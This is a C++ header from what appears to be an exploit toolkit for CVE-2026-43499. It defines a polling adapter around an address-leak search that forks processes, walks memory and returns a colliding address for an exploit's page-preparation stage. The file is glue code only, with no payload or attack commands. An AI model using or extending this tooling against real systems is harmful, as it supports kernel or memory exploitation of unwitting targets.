#pragma once
/** @file backend/cve_2026_43499/leak/snitch_policy.hpp
 *  The real search, wearing the shape the page preparation asks for.
 *
 *  The preparation polls a policy: start a search, ask whether it has found something, ask
 *  what, reset it. The search itself is a call that runs to a conclusion -- it maps, forks
 *  its cohort, waits, walks and stops -- so this adapter runs it once, on start, and
 *  answers the polls from what came back. That is the honest shape of the two: a poll
 *  cannot drive a search that is one call, and pretending otherwise would put the waiting
 *  inside a function whose name says it is asking a question.
 *
 *  What the preparation gets from it is the address the rule accepted, or nothing. A search
 *  that did not reach its walk reports that it found nothing rather than a zero address
 *  dressed as one, which is the same rule the failure path of the preparation already
 *  follows.
 */
#include <cstddef>
#include <cstdint>

#include "backend/cve_2026_43499/leak/leak_search.hpp"
#include "backend/cve_2026_43499/leak/snitch_run.hpp"
#include "backend/cve_2026_43499/memory/prepare_page.hpp"

namespace ghostlock::backend::cve_2026_43499::leak {
    /** Everything a run needs, kept so that start can do the whole thing at once. */
    struct SnitchPolicyArgs final {
        SnitchSetup setup{};
        RegionInputs region{};
        SnitchPatience patience{};
        std::size_t counter_offset = 0U;
        std::uint32_t *const *words = nullptr;
        std::size_t word_count = 0U;
        ScanStrides strides{};
        ScanRange range{};
        bool sweep_tags = false;
        const std::uint64_t *addresses = nullptr;
        std::size_t address_count = 0U;
    };

    /** What a search call reports, by value: whether it ran, whether it found, and what.
     *
     *  The answer travels in the return of a call rather than being read out of the policy
     *  afterwards. A device run is why: the same policy reported correctly through its returns
     *  and reported the values from before the call through its state, byte for byte unchanged
     *  in memory, with every classic explanation eliminated. The caller needs the answer, not
     *  the object, so the answer is what comes back. */
    struct SnitchStart final {
        /** Whether the search ran at all: false means its inputs were unusable. */
        bool ran = false;
        /** Whether an address answered the rule. */
        bool found = false;
        /** The address, and zero when nothing answered. */
        std::uint64_t address = 0U;
    };

    /** The preparation's view of a search: one run, then answers. */
    template <class Seam, class Buckets>
    struct SnitchPolicy final {
        SnitchPolicyArgs args{};
        const Buckets *buckets = nullptr;
        RunOutcome outcome{};
        bool ran = false;

        /** Run the whole search once. Starting twice keeps the first answer: a preparation
         *  that asked for a second search would be asking for a second cohort. */
        [[nodiscard]] SnitchStart start(std::size_t) noexcept {
            if (ran) {
                return poll();
            }
            if (buckets == nullptr) {
                return SnitchStart{};
            }
            outcome = run_snitch_search<Seam>(args.setup, args.region, args.patience, args.counter_offset,
                                              args.words, args.word_count, args.strides, args.range,
                                              args.sweep_tags, *buckets, args.addresses, args.address_count);
            ran = true;
            return poll();
        }

        /** What the search knows, by value: the answer the caller needs, in a return rather than
         *  in this object. A run that never reached its walk reports that it did not find one,
         *  rather than reporting the address of nothing. */
        [[nodiscard]] SnitchStart poll() const noexcept {
            SnitchStart answered{};
            /* Ran means the search reached a conclusion a caller can act on: it found an
             *  address, or it walked its range and none answered. A run that never got there
             *  -- no pokes, unusable geometry -- did not run, whatever else it did. */
            answered.ran = outcome.status == RunVerdict::Found || outcome.status == RunVerdict::NotFound;
            answered.found = outcome.status == RunVerdict::Found && outcome.found != 0U;
            answered.address = answered.found ? outcome.found : 0U;
            return answered;
        }

        /** Whether an address came back, asked of the answer rather than of the object. */
        [[nodiscard]] bool has_collision() const noexcept { return poll().found; }

        [[nodiscard]] std::uint64_t address() const noexcept { return poll().address; }

        /** Forgetting the answer does not unmap anything: the run's region is the caller's,
         *  and a reset only means the next question starts from nothing. */
        void reset() noexcept {
            outcome = RunOutcome{};
            ran = false;
        }
    };
}  // namespace
